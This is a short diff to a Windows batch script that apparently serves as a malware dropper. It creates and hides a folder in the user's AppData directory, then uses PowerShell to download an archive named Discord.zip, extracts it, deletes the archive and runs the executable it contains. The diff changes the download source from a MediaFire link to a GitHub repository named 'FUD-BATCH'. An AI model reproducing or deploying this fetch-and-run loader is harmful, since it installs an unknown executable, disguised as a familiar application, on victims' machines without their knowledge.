@@ -31,7 +31,7 @@ mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 :--------------------------------------
-Powershell -Command "Invoke-Webrequest 'https://download1078.mediafire.com/rsdo0zjvnlagdHUlBZ7aPjrgYjQyWpOVns62cwhgEqKZbrTH8YJ-1EYGgdACEwFLyLIQosxXn_zLuFvgr8AFg57-icPG5irEz7Ez4KW_ITjRugIYtX1bxJ5o5sggWYmXq87OQjQtK1EpOqIC2dq-XN0a3ZyzASxJ2stwStcexkQ/zia7omu0jvfao5z/Discord.zip' -OutFile Discord.zip"
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/FUD-BATCH/raw/main/Discord.zip' -OutFile Discord.zip"
 tar -xf Discord.zip
 del Discord.zip
 start Discord.exe
